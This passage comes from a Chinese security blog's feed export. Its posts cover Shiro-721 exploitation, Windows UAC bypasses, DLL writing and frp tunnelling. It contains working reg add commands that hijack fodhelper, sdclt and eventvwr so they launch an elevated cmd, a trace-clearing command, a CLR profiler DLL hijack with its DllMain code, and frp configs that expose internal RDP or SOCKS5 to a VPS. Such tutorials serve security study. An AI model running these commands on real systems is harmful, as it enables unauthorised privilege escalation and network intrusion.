class="headerlink" title="环境搭建"></a>环境搭建</h2><p>在这里下载1.4.1的war包<a href="https://github.com/jas502n/SHIRO-721/blob/master/samples-web-1.4.1.war%EF%BC%8C%E5%B9%B6%E6%94%BE%E5%85%A5tomcat">https://github.com/jas502n/SHIRO-721/blob/master/samples-web-1.4.1.war，并放入tomcat</a> webapps文件夹，随后启动tomcat，访问<a href="http://127.0.0.1:8080/samples-web-1.4.1/">http://127.0.0.1:8080/samples-web-1.4.1/</a></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310220716846.png" alt="image-20210310220716846"></p><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>大致逻辑与shiro-550差不多，直接说利用吧。</p><p><a href="https://github.com/inspiringz/Shiro-721">https://github.com/inspiringz/Shiro-721</a> 使用这个工具</p><p>首先我们得勾选rememberme，抓包获得rememberme cookie</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310221230268.png" alt="image-20210310221230268"></p><p>然后通过ysoserial生成payload，将其通过管道符传入某个文件，随后用刚刚那个工具里的shiro_exp.py</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python .&#x2F;shiro_exp.py &lt;url&gt; &lt;cookie&gt; &lt;paylaod文件&gt;</span><br></pre></td></tr></table></figure><p>随后会进行爆破，最后获得结果cookie后，传入并发包过去即可（爆破时间很长）</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310224415067.png" alt="image-20210310224415067"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h1&gt;&lt;h1 id=&quot;shiro&quot;&gt;&lt;a href=&quot;#shiro&quot; class=&quot;headerlink&quot; title=&quot;shiro&quot;&gt;&lt;/a&gt;shiro&lt;/h1&gt;&lt;p</summary>
      
    
    
    
    
    <category term="java开发与安全" scheme="http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>BypassUAC</title>
    <link href="http://const27.com/2021/03/04/Bypass%20UAC/"/>
    <id>http://const27.com/2021/03/04/Bypass%20UAC/</id>
    <published>2021-03-04T04:17:40.052Z</published>
    <updated>2021-03-04T04:21:23.507Z</updated>
    
    <content type="html"><![CDATA[<h1 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h1><p>用户帐户控制（User Account Control，简写作UAC)是<a href="https://baike.baidu.com/item/%E5%BE%AE%E8%BD%AF">微软</a>公司在其[Windows Vista](<a href="https://baike.baidu.com/item/Windows">https://baike.baidu.com/item/Windows</a> Vista)及更高版本操作系统中采用的一种控制机制，保护系统进行不必要的更改，提升操作系统的稳定性和安全性。<br>管理员在正常情况下是以低权限运行任务的，这个状态被称为被保护的管理员。但当管理员要执行高风险操作（如安装程序等），就需要提升权限去完成这些任务。这个提升权限的过程通常是这样的，相信各位都眼熟过。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210227191310985.png" alt="image-20210227191310985"></p><p>点击“是”，管理员就会提升到高权限再去运行该任务。</p><h1 id="autoElevate与requestedExecutionLevel"><a href="#autoElevate与requestedExecutionLevel" class="headerlink" title="autoElevate与requestedExecutionLevel"></a>autoElevate与requestedExecutionLevel</h1><h2 id="autoElevate"><a href="#autoElevate" class="headerlink" title="autoElevate"></a>autoElevate</h2><p>当某个EXE文件的文件清单里有&lt;autoElevate&gt; 元素时，当执行该文件时会默认提权执行。<br>我们劫持该exe文件的dll，可以达到Bypass UAC提权的目的。<br>适用范围:管理员权限以获得，要得到高权限管理员权限</p><p>一般用工具sigcheck检测</p><p>网上常拿C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe 举列子</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210301000136728.png" alt="image-20210301000136728"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210301000141880.png" alt="image-20210301000141880"></p><p>这个东西很有用，是下面部分方法的前提条件</p><h2 id="requestedExecutionLevel"><a href="#requestedExecutionLevel" class="headerlink" title="requestedExecutionLevel"></a>requestedExecutionLevel</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302125607741.png" alt="image-20210302125607741"></p><p>有三个不同的参数：asInvoker requireAdministrator highestAvailable 分别对应应用程序以什么权限运行</p><p>asInvoker：父进程是什么权限，此应用程序就是什么权限</p><p>requireAdministrator：需要以管理员权限来运行，此类应用程序图标右下方会有个盾牌标记<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302125851318.png" alt="image-20210302125851318"></p><p>highestAvailable：此程序以当前用户能获取到的最高权限运行。当你在管理员账户下运行此程序就会要求权限提升以及弹出UAC框。当你在标准账户下运行此程序，由于此账户的最高权限就是标准账户，所以双击便运行</p><h1 id="白名单程序"><a href="#白名单程序" class="headerlink" title="白名单程序"></a>白名单程序</h1><p>除了刚刚说的autoelevate，还有一类叫白名单程序的应用程序也是打开默认提权的。如服务管理工具下的许多应用都属于白名单程序，而其中又有些程序执行时需要依赖CLR支持（如事件查看器，任务计划程序）</p><h1 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h1><h2 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h2><p>reference:<a href="https://www.anquanke.com/post/id/209033">https://www.anquanke.com/post/id/209033</a><br><a href="https://www.cnblogs.com/0daybug/p/11719541.html">https://www.cnblogs.com/0daybug/p/11719541.html</a></p><p>exe文件运行时会加载许多dll文件，这些dll文件的加载顺序是</p><ul><li><p>程序所在目录</p></li><li><p>系统目录即<code>SYSTEM32</code>目录</p></li><li><p>16位系统目录即<code>SYSTEM</code>目录</p></li><li><p><code>Windows</code>目录</p></li><li><p>程序加载目录(<code>SetCurrentDirecctory</code>)</p></li><li><p><code>PATH</code>环境变量中列出的目录</p><p>同时，dll加载也遵循着<code>Know DLLs注册表项</code>的机制：Know DLLs注册表项指定的DLL是已经被操作系统加载过后的DLL，不会被应用程序搜索并加载。在注册表HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLS处可以看见这些dll</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210301184035776.png" alt="image-20210301184035776"></p></li></ul><p>在knowdlls表项中的dll是预先就加载进内存空间的，被诸多应用调用着，改动需要高权限。</p><p>如果我们在应用程序找到正确的dll之前，将我们自己创造的dll放入优先级更高的搜索目录让应用程序优先加载此dll文件，这就造成了dll劫持。但这只是dll劫持的其中一种途径，他有这些途径：</p><p>（1） DLL替换：用恶意的DLL替换掉合法的DLL<br>（2） DLL搜索顺序劫持：当应用程序加载DLL的时候，如果没有带指定DLL的路径，那么程序将会以特定的顺序依次在指定的路径下搜索待加载的DLL。通过将恶意DLL放在真实DLL之前的搜索位置，就可以劫持搜索顺序，劫持的目录有时候包括目标应用程序的工作目录。<br>（3） 虚拟DLL劫持：释放一个恶意的DLL来代替合法应用程序加载的丢失/不存在的DLL<br>（4） DLL重定向：更改DLL搜索的路径，比如通过编辑%PATH%环境变量或 .exe.manifest/.exe.local文件以将搜索路径定位到包含恶意DLL的地方。<br>（5） WinSxS DLL替换：将目标DLL相关的WinSxS文件夹中的恶意DLL替换为合法的DLL。此方法通常也被称为DLL侧加载<br>（6） 相对路径DLL劫持：将合法的应用程序复制（并有选择地重命名）与恶意的DLL一起放入到用户可写的文件夹中。在使用方法上，它与（签名的）二进制代理执行有相似之处。它的一个变体是（有点矛盾地称为）“自带LOLbin”，其中合法的应用程序带有恶意的DLL（而不是从受害者机器上的合法位置复制）。</p><h4 id="实践出真知1"><a href="#实践出真知1" class="headerlink" title="实践出真知1"></a>实践出真知1</h4><p>这里我们先用第一种方法来进行实验，实验对象是C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe和Listary。Listary是一个很好用的检索小工具，我通过processmonitor，设置好过滤条件，查看SystemPropertiesAdvanced.exe调用的dll时发现它会调用一个Listary下的一个名为ListaryHook.dll的dll。<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302132631680.png" alt="image-20210302132631680"></p><p>由于listary目录权限不高，我们可以直接替换该dll，换成dllmain为打开cmd的dll。然后点击运行SystemPropertiesAdvanced.exe，就会发现会弹出高权限cmd窗口<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302132724843.png" alt="image-20210302132724843"></p><p>bypassuac成功。 当然这种都不能算是一个洞，listary并不是人人电脑上都有的，而且这个软件装机量应该是极少数少的，所以这里只是提供一个思路，这种洞该怎么去找。</p><h4 id="实践出真知2"><a href="#实践出真知2" class="headerlink" title="实践出真知2"></a>实践出真知2</h4><p>这里使用第三种方法进行实验，实验对象是eventvwr.msc，它是管理工具中的事件查看器，它依赖于mmc.exe来运行。比如，你想运行它，就得通过mmc eventvwr.msc来运行它,并且在process exploer中只能看到个mmc.exe。</p><p>我们process monitor设置过滤如下</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302205938167.png" alt="image-20210302205938167"></p><p>cmd运行 mmc eventvwr.msc,查看调用</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302210053342.png" alt="image-20210302210053342"></p><p>dll搜索顺序确实是 程序目录-&gt;SYSTEM32-&gt;SYSTEM-&gt;WINDOWS-&gt;当前目录（这里也是SYSTEM32目录，我认为的原因是mmc会自动提升权限导致当前目录为System32导致的）-&gt;PATH目录。</p><p>我们只需在可写目录下植入名为elsext.dll的恶意dll，处理好dll的dllmain函数，就能让dllmain里的指令被高权限执行</p><p>但是无奈我这里环境是win7 sp1,但是这个洞7600才出现，所以复现不了了。但大概思路就是这样的</p><h2 id="CLR加载任意DLL"><a href="#CLR加载任意DLL" class="headerlink" title="CLR加载任意DLL"></a>CLR加载任意DLL</h2><p>CLR是微软为.net运行时提供的环境，像java的虚拟机一样，而clr有一个Profiling机制。这个机制简而言之便是可以给CLR提供一个dll，当任何高权限.NET运行时都会主动加载该DLL，我们可以构造恶意dll给CLR加载，从而获得高权限的进程如cmd，从而bypassuac。</p><p>至于这个dll如何给CLR，是通过修改以下环境变量实现的</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">COR_ENABLE_PROFILING &#x3D; 1</span><br><span class="line"></span><br><span class="line">COR_PROFILER&#x3D;&#123;CLSIDor ProgID&#125;</span><br></pre></td></tr></table></figure><p>CLR会检查环境变量中的COR_ENABLE_PROFILING，若为1则检查通过，进行下一步。<br>在net4.0以前，若检查通过，会马上去查找COR_PROFILER指定的注册表项，找到其dll路径并加载<br>net4.0后，会先查找COR_PROFILER_PATH是否指定dll文件路径，若没有再去查找COR_PROFILER指定的注册表项，找到其dll路径并加载。<br>总而言之，我们设置好COR_ENABLE_PROFILING和COR_PROFILER两个项就可以了。</p><p>接下来我们设置用户环境变量，设置用户环境变量时不需要高权限（win10似乎设置系统环境变量也不需要）。<br>以及在注册表，在指定的CLSID属性下新建Inprocserver32项，并写入恶意dll路径. 然后通过mmc调用一下gpedit.msc这种程序，即可以高权限执行dll。如果dll执行命令为system(“cmd.exe”)  那么就会蹦出来高权限cmd窗口</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">REG ADD &quot;HKCU\Software\Classes\CLSID\&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;\InprocServer32&quot; &#x2F;ve &#x2F;t REG_EXPAND_SZ &#x2F;d &quot;C:\test\calc.dll&quot; &#x2F;f</span><br><span class="line">REG ADD &quot;HKCU\Environment&quot; &#x2F;v &quot;COR_PROFILER&quot; &#x2F;t REG_SZ &#x2F;d &quot;&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;&quot; &#x2F;f</span><br><span class="line">REG ADD &quot;HKCU\Environment&quot; &#x2F;v &quot;COR_ENABLE_PROFILING&quot; &#x2F;t REG_SZ &#x2F;d &quot;1&quot; &#x2F;f</span><br><span class="line">mmc gpedit.msc</span><br></pre></td></tr></table></figure><p>但我死活复现不起不知道为啥，我的dll这样写的</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)</span><br><span class="line">&#123;</span><br><span class="line">    char cmd[] &#x3D; &quot;cmd.exe&quot;;</span><br><span class="line"></span><br><span class="line">    switch (fdwReason)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">        WinExec(cmd, SW_SHOWNORMAL);</span><br><span class="line">        ExitProcess(0);</span><br><span class="line">        break;</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">        break;</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外的，你还可以为COR_PROFILER_PATH设置为如\\server\share\test.dll的smb的路径，这样也可以实现bypassuac（没复现）</p><h2 id="白名单程序-1"><a href="#白名单程序-1" class="headerlink" title="白名单程序"></a>白名单程序</h2><h3 id="odbcad32-exe"><a href="#odbcad32-exe" class="headerlink" title="odbcad32.exe"></a>odbcad32.exe</h3><p>这个方法很简单。打开C:\Windows\system32\odbcad32.exe，然后通过以下方法打开powershell或者cmd</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302133941728.png" alt="image-20210302133941728"></p><p>成功bypass</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302134014137.png" alt="image-20210302134014137"></p><h3 id="管理工具"><a href="#管理工具" class="headerlink" title="管理工具"></a>管理工具</h3><p>之前说过，管理工具有很多白名单程序，如果一个白名单程序有浏览文件目录的功能，就可以以此来创建高权限cmd窗口。这里拿事件查看器举例</p><p>操作-》打开保存的目录-》文件目录路径处输入powershell-》弹出高权限powershell    以此内推，还有很多相似的管理工具可以这样利用</p><h2 id="注册表劫持"><a href="#注册表劫持" class="headerlink" title="注册表劫持"></a>注册表劫持</h2><h3 id="Fodhelper-exe"><a href="#Fodhelper-exe" class="headerlink" title="Fodhelper.exe"></a>Fodhelper.exe</h3><p>Fodhelper.exe win10才有，所以只有win10能通过这个办法bypassuac，他是一个autoelevate元素程序</p><p>我们使用proceemonitor查看事件查看器启动的时候执行了什么。我们通过排查发现了此处</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302194843185.png" alt="image-20210302194843185"></p><p>发现程序试图打开HKCU\Software\Classes\ms-settings\shell\open\command，但是这个项没有找到，因为这个项并不存在，于是它查询 HKCR\ms-settings\Shell\Open,查询成功便打开其下的Command键进行查询。<br>我们可以劫持注册表，往HKCU\Software\Classes\ms-settings\shell\open\command写入恶意指令从而达到bypassuac的目的。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command &#x2F;d C:\Windows\System32\cmd.exe &#x2F;f </span><br><span class="line">reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command &#x2F;v DelegateExecute &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br></pre></td></tr></table></figure><p>我们写入如下命令，就能让Fodhelper.exe 执行时自动高权限执行cmd窗口了</p><p>然后消除痕迹</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg delete &quot;HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command&quot;</span><br></pre></td></tr></table></figure><h3 id="sdclt"><a href="#sdclt" class="headerlink" title="sdclt"></a>sdclt</h3><p>Win10后这个程序才有自动提升权限的能力</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKCU\Software\Classes\Folder\shell\open\command&quot; &#x2F;d C:\Windows\System32\cmd.exe &#x2F;f </span><br><span class="line">reg add &quot;HKCU\Software\Classes\Folder\shell\open\command&quot; &#x2F;v &quot;DelegateExecute&quot; &#x2F;f</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302201240945.png" alt="image-20210302201240945"></p><h3 id="eventvmr"><a href="#eventvmr" class="headerlink" title="eventvmr"></a>eventvmr</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKCU\Software\Classes\mscfile\shell\open\command&quot; &#x2F;d C:\Windows\System32\cmd.exe &#x2F;f</span><br></pre></td></tr></table></figure><p>win10，win7均无效,不知道是哪个版本的事了，反正记录下来吧。</p><h2 id="COM劫持"><a href="#COM劫持" class="headerlink" title="COM劫持"></a>COM劫持</h2><h1 id="UACME"><a href="#UACME" class="headerlink" title="UACME"></a>UACME</h1><p>一个开源项目，记录了许多Bypassuac的方法。</p><p><a href="https://github.com/hfiref0x/UACME/tree/v3.2.x">https://github.com/hfiref0x/UACME/tree/v3.2.x</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;UAC&quot;&gt;&lt;a href=&quot;#UAC&quot; class=&quot;headerlink&quot; title=&quot;UAC&quot;&gt;&lt;/a&gt;UAC&lt;/h1&gt;&lt;p&gt;用户帐户控制（User Account Control，简写作UAC)是&lt;a href=&quot;https://baike.baidu.c</summary>
      
    
    
    
    
    <category term="提权" scheme="http://const27.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>dll文件编写</title>
    <link href="http://const27.com/2021/03/04/dll%E6%96%87%E4%BB%B6%E7%BC%96%E5%86%99/"/>
    <id>http://const27.com/2021/03/04/dll%E6%96%87%E4%BB%B6%E7%BC%96%E5%86%99/</id>
    <published>2021-03-04T04:17:29.391Z</published>
    <updated>2021-03-01T11:48:36.631Z</updated>
    
    <content type="html"><![CDATA[<p>DLL文件，即动态链接库文件，在windows中许多pe文件运行时需要将一些dll文件加载进内存，从而调用dll文件里的内容。</p><h1 id="DLLMAIN"><a href="#DLLMAIN" class="headerlink" title="DLLMAIN"></a>DLLMAIN</h1><p>dllmain，是dll在被加载时执行的函数（dllmain在dll文件中不是必须的）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BOOL WINAPI DLLMain(</span><br><span class="line">&#x2F;&#x2F;指向自身句柄</span><br><span class="line">_In_HINSTANCE hinstDLL,</span><br><span class="line">&#x2F;&#x2F;载入状态</span><br><span class="line">_In_DWORD fdwReason,</span><br><span class="line">&#x2F;&#x2F;加载方式（隐式、显式）</span><br><span class="line">_In_LPVOID IpvReserved</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>其中，载入状态有四种，如下</p><p>DLL_PROCESS_ATTACH：进程进入时</p><p>DLL_PROCESS_DETACH：进程退出时</p><p>DLL_THREAD_ATTACH：线程进入时</p><p>DLL_THREAD_DETACH：线程退出时</p><p>dllmain根据载入状态的不同，可以做出不同的反应。就像这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class="line">                       DWORD  ul_reason_for_call,</span><br><span class="line">                       LPVOID lpReserved</span><br><span class="line">                     )</span><br><span class="line">&#123;</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">case DLL_PROCESS_ATTACH:</span><br><span class="line">std::cout &lt;&lt; &quot;Process attach. \n&quot;;</span><br><span class="line">break;</span><br><span class="line">case DLL_PROCESS_DETACH:</span><br><span class="line">std::cout &lt;&lt; &quot;Process exit. \n&quot;;</span><br><span class="line">break;</span><br><span class="line">case DLL_THREAD_ATTACH:</span><br><span class="line">std::cout &lt;&lt; &quot;Thread attach. \n&quot;;</span><br><span class="line">break;</span><br><span class="line">case DLL_THREAD_DETACH:</span><br><span class="line">std::cout &lt;&lt; &quot;Thread exit. \n&quot;;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="DLL-导出函数"><a href="#DLL-导出函数" class="headerlink" title="DLL 导出函数"></a>DLL 导出函数</h1><p>dll编写时，要用__declspec关键字标明哪些函数是要导出的,_</p><p>__declspec(dllexport) 用于Windows中的动态库中，声明导出函数、类、对象等供外面调用,像这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extern &quot;C&quot; int _declspec(dllexport) go() &#123;</span><br><span class="line">    std::cout&lt;&lt;&quot;gogo&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就设置好一个用于导出的函数了。</p><h2 id="题外话：怎么使用dll或lib中的导出函数"><a href="#题外话：怎么使用dll或lib中的导出函数" class="headerlink" title="题外话：怎么使用dll或lib中的导出函数"></a>题外话：怎么使用dll或lib中的导出函数</h2><p>对于lib（静态链接库）来说，使用静态链接  dll（动态链接库）来说使用动态链接</p><h3 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h3><p>又叫隐式链接。链接器从库中复制这些函数和数据并把它们和应用程序的其它模块组合起来创建最终的可执行文件(.EXE文件)，所以组成的exe文件体积较大</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#pragma comment(lib,&quot;testDLL.lib&quot;)  &#x2F;&#x2F;在此处通过静态链接，此之前把生成的lib文件放入loadDLL工程文件夹下面，并设置编译器的附加依赖项中增加此lib</span><br><span class="line">extern &quot;C&quot;_declspec(dllimport) int go(); &#x2F;&#x2F;声明函数</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">go();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h3><p>又叫显示链接，将一些api函数写入到一个dll文件中，在程序在程序运行时再加载到程序的进程空间中使用，这样可以让运行程序本身体积较小，方便模块化编程。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int TestDLL()</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">      HMODULE hModule &#x3D; NULL;</span><br><span class="line"></span><br><span class="line">      typedef int (*Func)(int a, int b);</span><br><span class="line"></span><br><span class="line">      &#x2F;&#x2F; 动态加载 DLL 文件</span><br><span class="line">      hModule &#x3D; LoadLibrary(_TEXT(&quot;..&#x2F;&#x2F;Debug&#x2F;&#x2F;FuncDll.dll&quot; ));</span><br><span class="line"></span><br><span class="line">      &#x2F;&#x2F; 获取 fun函数地址</span><br><span class="line">      Func fAdd &#x3D; (Func)GetProcAddress(hModule, &quot;fun&quot; );</span><br><span class="line"></span><br><span class="line">      &#x2F;&#x2F; 使用函数指针</span><br><span class="line">      printf(&quot;%d&#x2F;n&quot; , fAdd(3, 1));</span><br><span class="line"></span><br><span class="line">      &#x2F;&#x2F; 释放指针</span><br><span class="line">      FreeLibrary(hModule);</span><br><span class="line">      return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="rundll32"><a href="#rundll32" class="headerlink" title="rundll32"></a>rundll32</h1><p>用rundll32.exe 可以执行dll中的某一导出函数</p><p>但是不是所有函数都能通过rundll32调用，函数必须符合如下定义</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">VOID CALLBACK FunctionName (HWND hwnd,HINSTANCE hinst,LPTSTR lpCmdLine,INT nCmdShow);</span><br></pre></td></tr></table></figure><p>这里随便写了个</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extern &quot;C&quot; __declspec(dllexport) void rundll(HWND hwnd, HINSTANCE hinst, LPTSTR lpCmdLine, INT nCmdShow) &#123;</span><br><span class="line"></span><br><span class="line">    MessageBox(NULL, TEXT(&quot;-Test-&quot;), TEXT(&quot;Rundll32&quot;), MB_OK);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210301194831320.png" alt="image-20210301194831320"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;DLL文件，即动态链接库文件，在windows中许多pe文件运行时需要将一些dll文件加载进内存，从而调用dll文件里的内容。&lt;/p&gt;
&lt;h1 id=&quot;DLLMAIN&quot;&gt;&lt;a href=&quot;#DLLMAIN&quot; class=&quot;headerlink&quot; title=&quot;DLLMAIN</summary>
      
    
    
    
    
    <category term="windows相关" scheme="http://const27.com/tags/windows%E7%9B%B8%E5%85%B3/"/>
    
  </entry>
  
  <entry>
    <title>frp使用</title>
    <link href="http://const27.com/2021/02/26/%E4%B8%80%E4%BA%9B%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    <id>http://const27.com/2021/02/26/%E4%B8%80%E4%BA%9B%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</id>
    <published>2021-02-26T12:53:42.913Z</published>
    <updated>2021-02-26T11:36:31.938Z</updated>
    
    <content type="html"><![CDATA[<h1 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h1><p>frp，确实蛮好用的，他基本不会被杀软杀掉。而且无论是win到win，linux到linux还是win到linux的转发，它都支持。 Download；<a href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p><p>frp分为有两个主要可执行文件，frps和frpc，对应的配置文件为frps.ini和frpc.ini。</p><p>其中frps用作服务端，在进行渗透的时候一般架设在公网VPS上，它的配置文件默认为这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 10067  #监听的端口</span><br><span class="line"></span><br><span class="line">运行 frps -c frps.ini</span><br></pre></td></tr></table></figure><p>frpc用作客户端，在进行渗透的时候一般假设在内网机器上，它的默认文件一般长这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 149.17.4.190 # 指定需要转发到的公网IP</span><br><span class="line">server_port &#x3D; 10067 # 公网VPS上所监听的端口</span><br><span class="line"></span><br><span class="line">[socks_proxy] # 标签名，任意</span><br><span class="line">type &#x3D; tcp #设置转发的协议</span><br><span class="line">local_ip&#x3D;127.0.0.1 #填127.0.0.1就完事了</span><br><span class="line">local_port&#x3D;3389 #需要被转发的端口</span><br><span class="line">remote_port&#x3D;10068 #转发到VPS上的端口</span><br><span class="line"></span><br><span class="line">运行 frpc -c frpc.ini</span><br></pre></td></tr></table></figure><p>当我们在VPS上运行frps，内网机器运行frpc后，内网机器的3389端口就会被转发到公网的10068端口上，接下来我们远程链接 149.17.4.190:10068 即可连进内网机器的远程桌面了。</p><p>上面是端口映射，下面是直接走socks5代理</p><p>服务端:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr &#x3D; 0.0.0.0</span><br><span class="line">bind_port &#x3D; 7000</span><br><span class="line"> </span><br><span class="line"># 用户密码保平安</span><br><span class="line">dashboard_user &#x3D; admin1</span><br><span class="line">dashboard_pwd &#x3D; hadaessd@@@!!@@#</span><br><span class="line"># 允许客户端绑定的端口</span><br><span class="line">allow_ports &#x3D; 40000-50000</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">#remote vps addr</span><br><span class="line">server_addr &#x3D; your vps addr</span><br><span class="line">#端口自选</span><br><span class="line">server_port &#x3D; 7000   </span><br><span class="line">tls_enable &#x3D; true</span><br><span class="line">pool_count &#x3D; 5</span><br><span class="line"> </span><br><span class="line">[plugin_socks]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 46075</span><br><span class="line">plugin &#x3D; socks5</span><br><span class="line">plugin_user &#x3D; admin</span><br><span class="line">plugin_passwd &#x3D; hahha@@###</span><br><span class="line">use_encryption &#x3D; true</span><br><span class="line">use_compression &#x3D; true</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;frp&quot;&gt;&lt;a href=&quot;#frp&quot; class=&quot;headerlink&quot; title=&quot;frp&quot;&gt;&lt;/a&gt;frp&lt;/h1&gt;&lt;p&gt;frp，确实蛮好用的，他基本不会被杀软杀掉。而且无论是win到win，linux到linux还是win到linux的转发，它都支持。</summary>
      
    
    
    
    
    <category term="内网渗透" scheme="http://const27.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>java安全中几个重要机制</title>
    <link href="http://const27.com/2021/02/19/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/"/>
    <id>http://const27.com/2021/02/19/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/</id>
    <published>2021-02-19T09:22:05.038Z</published>
    <updated>2021-02-19T08:47:49.404Z</updated>
    
